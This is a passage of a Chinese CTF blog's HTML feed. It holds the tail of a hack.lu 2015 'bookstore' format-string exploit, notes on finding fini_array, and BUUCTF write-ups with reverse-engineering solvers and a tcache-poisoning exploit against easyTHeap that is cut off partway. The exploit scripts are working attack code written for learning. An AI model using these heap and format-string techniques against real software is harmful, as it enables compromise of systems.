  command(cmd)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;order:\n&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    command(cmd+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">fini_array = <span class="number">0x6011B8</span></span><br><span class="line">main_addr = <span class="number">0x400A39</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ====round1====</span></span><br><span class="line"><span class="comment"># free book2 放入 unsortedbin </span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># 修改 fini_array 为 main</span></span><br><span class="line"><span class="comment"># 泄露 libc_base</span></span><br><span class="line"><span class="comment"># 泄露 stack 地址</span></span><br><span class="line">payload1 = <span class="string">&quot;%2617c%13$hn&quot;</span> + <span class="string">&#x27;|&#x27;</span> + <span class="string">&quot;%14$s&quot;</span> + <span class="string">&#x27;-&#x27;</span> + <span class="string">&quot;%24$p&quot;</span></span><br><span class="line">payload1 = payload1.ljust(<span class="number">0x74</span>,<span class="string">&#x27;a&#x27;</span>).ljust(<span class="number">0x88</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x151</span>)      </span><br><span class="line">edit(<span class="number">1</span>,payload1)            </span><br><span class="line"></span><br><span class="line"><span class="comment"># 从菜单选项将fini_array和free_got写入到栈上</span></span><br><span class="line">payload2 = <span class="string">&#x27;5&#x27;</span>*<span class="number">8</span> + p64(fini_array) + p64(free_got)</span><br><span class="line">p.recvuntil(<span class="string">&quot;5: Submit\n&quot;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.recvuntil(<span class="string">&quot;|&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;|&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;|&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理libc地址</span></span><br><span class="line">free_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;free_addr:&quot;</span>+<span class="built_in">hex</span>(free_addr))</span><br><span class="line">libc_base = free_addr - libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">onegadget = libc_base + <span class="number">0x45226</span> </span><br><span class="line">log.info(<span class="string">&quot;onegadget:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理栈地址</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;-&quot;</span>)</span><br><span class="line">ret_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;ret_addr:&quot;</span>+<span class="built_in">hex</span>(ret_addr))</span><br><span class="line">attack_addr = ret_addr - <span class="number">0x106</span></span><br><span class="line">log.info(<span class="string">&quot;attack_addr:&quot;</span>+<span class="built_in">hex</span>(attack_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ====round2====</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 同 round1</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理格式化字符串填充字节数，处理高地址值小于低地址情况</span></span><br><span class="line">one_1 = onegadget &amp; <span class="number">0xffff</span></span><br><span class="line">log.info(<span class="string">&quot;one_1:&quot;</span>+<span class="built_in">hex</span>(one_1))</span><br><span class="line">one_2 = onegadget&gt;&gt;<span class="number">16</span> &amp; <span class="number">0xffff</span></span><br><span class="line">log.info(<span class="string">&quot;one_2:&quot;</span>+<span class="built_in">hex</span>(one_2))</span><br><span class="line"><span class="keyword">if</span> one_1 &gt; one_2:</span><br><span class="line">    one_2 = one_2 + <span class="number">0x10000</span> - one_1</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one_2 -= one_1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改第二次main返回地址</span></span><br><span class="line">payload4 = <span class="string">&quot;%&#123;&#125;c%13$hn&quot;</span>.<span class="built_in">format</span>(one_1) + <span class="string">&quot;%&#123;&#125;c%14$hn&quot;</span>.<span class="built_in">format</span>(one_2)</span><br><span class="line">payload4 = payload4.ljust(<span class="number">0x74</span>,<span class="string">&#x27;c&#x27;</span>).ljust(<span class="number">0x88</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload4 += p64(<span class="number">0x151</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload4)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload3 = <span class="string">&#x27;5&#x27;</span>*<span class="number">8</span> + p64(attack_addr) + p64(attack_addr+<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;5: Submit\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ul><li><a href="https://bbs.pediy.com/thread-246783.htm">hack.lu 2015 bookstore writeup</a></li><li><a href="https://blog.csdn.net/qq_43449190/article/details/89077783">2015-hacklu-bookstore</a></li></ul><h3 id="补充总结"><a href="#补充总结" class="headerlink" title="补充总结"></a>补充总结</h3><h5 id="怎么找-fini-array-？"><a href="#怎么找-fini-array-？" class="headerlink" title="怎么找 fini_array ？"></a>怎么找 fini_array ？</h5><p>首先 fini_array 是 __libc_csu_fini 函数里面会用的一个列表，当程序退出时会调用这个数组存放的一个或两个函数，调用完成后才继续完成退出函数，这时才是真正退出程序。</p><h6 id="64-位静态链接程序"><a href="#64-位静态链接程序" class="headerlink" title="64 位静态链接程序"></a>64 位静态链接程序</h6><p>fini_array 数组长度为 0x10 字节，里面放了两个函数地址，退出 main 函数会先执行 fini_array[1] ，然后执行 fini_array[0] 。</p><p>在<a href="https://www.mrskye.cn/archives/173">劫持 64 位静态程序 fini_array 进行 ROP 攻击</a>里面接触的是 64 位静态编译的程序，程序是没有符号表的，寻找 fini_array 方法是：</p><p>首先 <code>readelf -h 程序名</code> 查看程序加载入口地址。</p><p>gdb 调试将断点打在入口地址 ，然后找到有三个传参的 mov 指令，mov r8 就是 __libc_csu_fini 的地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401A60                 public start</span><br><span class="line">.text:0000000000401A60 start           proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">.text:0000000000401A60 ; __unwind &#123;</span><br><span class="line">.text:0000000000401A60                 xor     ebp, ebp</span><br><span class="line">.text:0000000000401A62                 mov     r9, rdx</span><br><span class="line">.text:0000000000401A65                 pop     rsi</span><br><span class="line">.text:0000000000401A66                 mov     rdx, rsp</span><br><span class="line">.text:0000000000401A69                 and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:0000000000401A6D                 push    rax</span><br><span class="line">.text:0000000000401A6E                 push    rsp</span><br><span class="line">.text:0000000000401A6F                 mov     r8, offset sub_402BD0 ; fini</span><br><span class="line">.text:0000000000401A76                 mov     rcx, offset loc_402B40 ; init</span><br><span class="line">.text:0000000000401A7D                 mov     rdi, offset main</span><br><span class="line">.text:0000000000401A84                 db      67h</span><br><span class="line">.text:0000000000401A84                 call    __libc_start_main</span><br><span class="line">.text:0000000000401A8A                 hlt</span><br><span class="line">.text:0000000000401A8A ; &#125; // starts at 401A60</span><br><span class="line">.text:0000000000401A8A start           endp</span><br></pre></td></tr></table></figure><p>然后 <code>x /20i addr</code> 查看该地址开始的汇编，找到 <code>lea    rbp,[rip+0xb***1] # 0x4***f0</code> ，这个地址就是 fini_array[1] 的地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20i 0x402bd0</span></span><br><span class="line">  0x402bd0 &lt;__libc_csu_fini&gt;:    push   rbp</span><br><span class="line">  0x402bd1 &lt;__libc_csu_fini+1&gt;:    lea    rax,[rip+0xb24e8]        # 0x4***c0 </span><br><span class="line">  0x402bd8 &lt;__libc_csu_fini+8&gt;:    lea    rbp,[rip+0xb24d1]        # 0x4***b0 </span><br><span class="line">  0x402bdf &lt;__libc_csu_fini+15&gt;:    push   rbx</span><br><span class="line">  0x402be0 &lt;__libc_csu_fini+16&gt;:    sub    rax,rbp</span><br><span class="line">  0x402be3 &lt;__libc_csu_fini+19&gt;:    sub    rsp,0x8</span><br><span class="line">  0x402be7 &lt;__libc_csu_fini+23&gt;:    sar    rax,0x3</span><br><span class="line">  0x402beb &lt;__libc_csu_fini+27&gt;:    je     0x402c06 &lt;__libc_csu_fini+54&gt;</span><br><span class="line">  0x402bed &lt;__libc_csu_fini+29&gt;:    lea    rbx,[rax-0x1]</span><br><span class="line">  0x402bf1 &lt;__libc_csu_fini+33&gt;:    nop    DWORD PTR [rax+0x0]</span><br><span class="line">  0x402bf8 &lt;__libc_csu_fini+40&gt;:    call   QWORD PTR [rbp+rbx*8+0x0]</span><br><span class="line">  0x402bfc &lt;__libc_csu_fini+44&gt;:    sub    rbx,0x1</span><br><span class="line">  0x402c00 &lt;__libc_csu_fini+48&gt;:    cmp    rbx,0xffffffffffffffff</span><br><span class="line">  0x402c04 &lt;__libc_csu_fini+52&gt;:    jne    0x402bf8 &lt;__libc_csu_fini+40&gt;</span><br><span class="line">  0x402c06 &lt;__libc_csu_fini+54&gt;:    add    rsp,0x8</span><br><span class="line">  0x402c0a &lt;__libc_csu_fini+58&gt;:    pop    rbx</span><br><span class="line">  0x402c0b &lt;__libc_csu_fini+59&gt;:    pop    rbp</span><br><span class="line">  0x402c0c &lt;__libc_csu_fini+60&gt;:    jmp    0x48f52c &lt;_fini&gt;</span><br></pre></td></tr></table></figure><h6 id="64-位动态链接程序"><a href="#64-位动态链接程序" class="headerlink" title="64 位动态链接程序"></a>64 位动态链接程序</h6><p>fini_array 数组长度为 0x8 字节，里面放了一个函数地址，退出 main 函数会执行 fini_array[0]。</p><p>gdb 输入 <code>elf</code> 找 <code>.fini_array</code> ，开始地址就是 fini_array[0] </p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-qQxmRkH3KtjuybNr.png"></p><p>或者 IDA <code>ctrl+s</code> 找 .fini_array 分段 ：</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-ztIjbG96doGOhSfu.png"></p><p>64 位中只有 fini_array[0] ，没有 fini_array[1] ，也就是只能运行写入 fini_array 一次，然后就正常退出了。无法像静态编译那样重复调用。</p><h6 id="静态动态利用方式小结"><a href="#静态动态利用方式小结" class="headerlink" title="静态动态利用方式小结"></a>静态动态利用方式小结</h6><p>动态程序目前就遇到 <code>2015 hacklu bookstore</code> 这一题，太菜了总结不出规律。</p><p>静态程序基本上套路是劫持 fini_array + 循环写入，将 ROP 链布置到 fini_array + 0x10 ，写入完成后将栈迁移到 fini_array + 0x10 执行 ROP 链。静态程序的总结可以看看<a href="https://www.freebuf.com/articles/system/226003.html">淇淇师傅文章</a>。</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fini_array </tag>
            
            <tag> chunk extend </tag>
            
            <tag> chunk overlapping </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buu刷题记录</title>
      <link href="archives/fcb705b7/"/>
      <url>archives/fcb705b7/</url>
      
        <content type="html"><![CDATA[<h2 id="wustctf2020-name-your-dog"><a href="#wustctf2020-name-your-dog" class="headerlink" title="wustctf2020_name_your_dog"></a>wustctf2020_name_your_dog</h2><p>数组下标溢出，修改 got 表</p><h2 id="mrctf2020-shellcode-revenge"><a href="#mrctf2020-shellcode-revenge" class="headerlink" title="mrctf2020_shellcode_revenge"></a>mrctf2020_shellcode_revenge</h2><p>将 shellcode 换个编码，换成用可见字符串组成。</p><p><a href="https://blog.csdn.net/weixin_44145820/article/details/105565953">https://blog.csdn.net/weixin_44145820/article/details/105565953</a></p><h2 id="护网杯-2018-gettingstart"><a href="#护网杯-2018-gettingstart" class="headerlink" title="护网杯_2018_gettingstart"></a>护网杯_2018_gettingstart</h2><p>普通栈溢出，考点是浮点数在内存中怎么用 16 进制表示</p><p>浮点数16进制在线转换网站：<a href="http://www.binaryconvert.com/result_double.html?decimal=048046049">http://www.binaryconvert.com/result_double.html?decimal=048046049</a></p><h2 id="ciscn-2019-en-3"><a href="#ciscn-2019-en-3" class="headerlink" title="ciscn_2019_en_3"></a>ciscn_2019_en_3</h2><p><code>_printf_chk</code>会检测<code>%N$</code>，换个思路泄露寄存器中的 libc 地址</p><p>还有注意 buu 上 ubuntu18 绝大部分的环境是旧 glibc 没有 tcache double free 保护</p><h2 id="reverse1"><a href="#reverse1" class="headerlink" title="reverse1"></a>reverse1</h2><h3 id="1-PE文件分析"><a href="#1-PE文件分析" class="headerlink" title="1. PE文件分析"></a>1. PE文件分析</h3><p>用的是 Exeinfo PE 这个软件，吾爱上有分享，爱盘也有收录。</p><p>这一步有点类似 pwn 查看程序的版本、保护情况：</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-07-31-pX6ckeUapk9UgVY3.png"></p><p>64 位的程序。</p><h3 id="2-运行程序获取信息"><a href="#2-运行程序获取信息" class="headerlink" title="2. 运行程序获取信息"></a>2. 运行程序获取信息</h3><p>题目最好在 命令行 中运行，避免运行结束前的提示字符没来得及看就关闭了。</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-07-31-Y7GTDgHZ3hN4n2WB.png"></p><h3 id="3-x64dbg-打开"><a href="#3-x64dbg-打开" class="headerlink" title="3. x64dbg 打开"></a>3. x64dbg 打开</h3><p>也可以用 OD 打开，因为OllyDbg 官方中文，我用这个入门吧。</p><p>用字符串定位程序关键位置，<em>直接点面板的字符串，查找结果不全面的</em>，需要在代码处右键选查找全部模块字符串：</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-07-31-Dj00PyB60YresYVz.png"></p><p>然后操作逻辑就相当于 IDA 的了。</p><p>这里我是硬读汇编判断，将输入值与 <code>&#123;hell0_w0rld&#125;</code> 对比的，0x00007FF7F26F197E 明显调用 strcmp 用于比较。一开始以为是 <code>&#123;hello_world&#125;</code> ，发现还有一部分汇编将 <code>o</code> 换成 <code>0</code> ：</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-07-31-ExD4u8sRdKdmCGOv.png"></p><h2 id="reverse2"><a href="#reverse2" class="headerlink" title="reverse2"></a>reverse2</h2><h3 id="1-文件分析"><a href="#1-文件分析" class="headerlink" title="1. 文件分析"></a>1. 文件分析</h3><p>64 位二进制文件</p><h3 id="2-IDA-静态分析"><a href="#2-IDA-静态分析" class="headerlink" title="2. IDA 静态分析"></a>2. IDA 静态分析</h3><p>flag 在程序中，最后结果需要进行替换处理，替换逻辑：将 i r 替换为 1</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-08-01-InUq0BEFvNRjIjoo.png"></p><h2 id="内涵软件"><a href="#内涵软件" class="headerlink" title="内涵软件"></a>内涵软件</h2><p>IDA 打开即可</p><h2 id="helloworld"><a href="#helloworld" class="headerlink" title="helloworld"></a>helloworld</h2><p>android killer 打开即可</p><h2 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h2><p>64 位程序；IDA 打开，里面大概逻辑是将输入的 33 字节数据进行一个加密，加密逻辑：当前字符密文等于前一个字符与当前字符的异或。</p><p>写一下脚本即可，这道题目重点是写到了 IDA 提取数据：<code>shite+E</code></p><p><img src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200801235303.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ida_chars =[<span class="number">0x66</span>, <span class="number">0x0A</span>, <span class="number">0x6B</span>, <span class="number">0x0C</span>, <span class="number">0x77</span>, <span class="number">0x26</span>, <span class="number">0x4F</span>, <span class="number">0x2E</span>, <span class="number">0x40</span>, <span class="number">0x11</span>, <span class="number">0x78</span>, <span class="number">0x0D</span>, <span class="number">0x5A</span>, <span class="number">0x3B</span>, <span class="number">0x55</span>, <span class="number">0x11</span>, <span class="number">0x70</span>, <span class="number">0x19</span>, <span class="number">0x46</span>, <span class="number">0x1F</span>,<span class="number">0x76</span>, <span class="number">0x22</span>, <span class="number">0x4D</span>, <span class="number">0x23</span>, <span class="number">0x44</span>, <span class="number">0x0E</span>, <span class="number">0x67</span>, <span class="number">0x06</span>, <span class="number">0x68</span>, <span class="number">0x0F</span>, <span class="number">0x47</span>, <span class="number">0x32</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>]</span><br><span class="line">flag = ida_chars</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">0</span>,<span class="number">33</span>))[::-<span class="number">1</span>]:</span><br><span class="line">flag[i]^=flag[i-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">print(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="reverse3"><a href="#reverse3" class="headerlink" title="reverse3"></a>reverse3</h2><p>Exeinfo PE 查出来是 32 位程序，运行一下了解一下程序流程。OD 之类工具不太会用，用 IDA 静态分析一下。</p><p>主要加密流程都是在 main 函数里面了，具体看图都全部都注释了：</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-08-02-equnGkrTRZAJL7VQ.png"></p><p>第一层加密根据中间用到一个字符串，推测出来应该是标准密码表的 base64 加密：</p><p><img src="http://mrskye.cn-gd.ufileos.com/img/2020-08-02-PctyQ8F7Ny5e7Jna.png"></p><p>第二层加密就是每个字符加 下标 ：</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-08-02-2zy7IuSTPC62gIxi.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : reverse3.py</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">ida_chars=[<span class="number">0x65</span>, <span class="number">0x33</span>, <span class="number">0x6E</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x49</span>, <span class="number">0x48</span>, <span class="number">0x39</span>, <span class="number">0x62</span>, <span class="number">0x5F</span>, <span class="number">0x43</span>, <span class="number">0x40</span>, <span class="number">0x6E</span>, <span class="number">0x40</span>, <span class="number">0x64</span>, <span class="number">0x48</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(ida_chars)):</span><br><span class="line">ida_chars[i] -= i</span><br><span class="line">print(ida_chars)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ida_chars:</span><br><span class="line">flag += <span class="built_in">chr</span>(i)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;flag&quot;</span>+base64.b64decode(flag).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="V-amp-N2020-公开赛-easyTHeap"><a href="#V-amp-N2020-公开赛-easyTHeap" class="headerlink" title="[V&amp;N2020 公开赛]easyTHeap"></a>[V&amp;N2020 公开赛]easyTHeap</h2><h3 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h3><p>保护全开</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#39;&#x2F;ctf&#x2F;work&#x2F;vn_pwn_easyTHeap&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>基本堆管理器，有增删查改功能。用 chunk_ptr_list 和 chunk_size_list 两个链表维护堆，堆数量实际上不由两个全局变量控制，而是受限于 chunk_ptr_list 是否有空位写入。全部功能操作都是基于下标去两个链表寻找对应地址操作的。</p><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>在释放的时候没有将 chunk_ptr_list 对应位置置零，造成 UAF ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">6</span> || !chunk_ptr_list[v1] )</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">free</span>((<span class="keyword">void</span> *)chunk_ptr_list[v1]);</span><br><span class="line">chunk_size_list[v1] = <span class="number">0</span>;                      <span class="comment">// chunk_ptr_list 没有置零</span></span><br></pre></td></tr></table></figure><p>注意一点是 chunk_size_list 对应位置被置零了，也就是不能使用 edit 功能写入：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, (<span class="keyword">void</span> *)chunk_ptr_list[v1], (<span class="keyword">unsigned</span> <span class="keyword">int</span>)chunk_size_list[v1]);</span><br></pre></td></tr></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>泄露堆地址，计算出 tcache struct 地址</li><li>修改结构体中对应 size 的数量标志位，将堆释放进 unsorted bin 泄露出 libc 地址</li><li>将 tcache 相关数量标志位恢复，将链头地址修改为 malloc_hook ，后面就是常规操作</li></ol><blockquote><p>为记笔记方便，下面所有地址均不是同一运行调试所得 Orz</p></blockquote><p>当程序释放第一个堆进 tcache 时会申请一块 0x240 的空间放 tcache struct ，里面记录各个 size 的数量和链头地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555564b5000</span><br><span class="line">Size: 0x251</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555564b5250</span><br><span class="line">Size: 0x91</span><br></pre></td></tr></table></figure><p>然后连续两次释放 chunk0 ，chunk0 fd 指针就会记录自己的地址。（tcache bin 中不会崩）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">tcachebins</span><br><span class="line">0x90 [  2]: 0x55555656b260 ◂— 0x55555656b260</span><br></pre></td></tr></table></figure><p>用程序查询功能泄露地址，其与 tcache struct 偏移固定的。</p><p>再申请相同 size 的堆，分配的是 chunk0 所在的空间，通过 edit 将 chunk0 fd 覆盖为 tcache struct ，两次分配后将堆分配到结构体上面。</p><p>顺便 gdb 记一下结构体内容，因为需要对应修改某个地址的值，达到修改某个 size 对应的链表。当申请的 size 时，需要修改的位置也会不一样。</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201024005454.png" alt="image-20201019011117803"></p><p>这里将 0x01 修改为 0x07 (MAX_NUM) ，到达上限后再释放一个堆就开始放入 unsorted bin 。释放 chunk0 ，show 泄露 libc 地址。</p><p>完事后，edit chunk3 将结构体 0x07 恢复为 0x01 ，链首地址修改为 malloc_hook 地址，形成这样的效果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> tcache bin 0x90 这条链表中只有 1 个堆，地址为 malloc_hook</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> bin</span></span><br><span class="line">tcachebins</span><br><span class="line">0x90 [  1]: [malloc_hook地址] ……</span><br></pre></td></tr></table></figure><p>这样下次分配就会分配到 malloc_hook 。实测后这个题目需要结合 realloc 调整栈帧环境，让 onegadget 生效。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>下面这个脚本是成功攻击远程的，与前面原理一样，只是做题的时候在 docker 环境做 main_arean 的偏移算出来和远程的 18 不相同。。。</p><p>这里就直接将 tcache 全部链表数量都改了，然后将 malloc_hook-8 放到任意链首，然后申请对应大小的 chunk 就能分配到 malloc_hook 上了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,</span><br><span class="line">terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&quot;/glibc/2.27/64/lib/ld-2.27.so&quot;, &quot;./vn_pwn_easyTHeap&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;/glibc/2.27/64/lib/libc.so.6&quot;&#125;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&quot;/glibc/2.27/64/lib/libc.so.6&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./vn_pwn_easyTHeap&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28954</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>(<span class="params">size</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span 